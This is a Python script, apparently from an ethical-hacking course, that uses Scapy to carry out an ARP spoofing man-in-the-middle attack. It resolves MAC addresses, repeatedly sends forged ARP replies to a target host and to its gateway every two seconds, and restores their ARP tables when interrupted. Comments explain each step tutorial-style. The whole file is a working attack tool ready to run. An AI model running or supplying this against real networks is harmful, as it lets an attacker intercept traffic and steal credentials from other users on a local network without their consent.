#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

#To list all the fields we can set within the brackets for the scapy.ARP command, we can use scapy.ls(scapy.ARP) to
# get a list of all the fields we can set.


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # in Scapy, we can use '/' to append variables together. We are appending our broadcast MAC asking for our
    # destination IP addresses. We are setting a timeout because if you don't, your program will not finish as
    # it will continue to wait on machines that will not respond. we are typing verbose=false so scapy's srp
    # will display less information in the command prompt.
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    #op by default is set to 1, when creating an ARP packet the default is to create an ARP Request. We set op to 2 to
    #create an ARP response instead. pdst is IP of target computer. hwdst is MAC of target computer. psrc is the source IP
    #that we are tricking the target into thinking we are, we are imitating the router. To get the router IP, use the CMD
    #route -n
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    #the restore function calls the get_mac function to retrieve the destination and source ip. we then construct
    #an ARP packet with scapy to restore the victim's ARP table back to how it initially was.
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


#creating a while loop to continously spoof two packets every two seconds to the victim computer and the router. Using
#sent_packets_count variable to count how many packets total have been sent. Printing the counter dynamically on one
#line '\r' makes python print the statement always at the start of the line. we're using the comma to store the outputs
#in a buffer, and using sys.stdout.flush to immediately print the outputs.

target_ip = "10.0.2.4"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Resetting ARP tables.....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)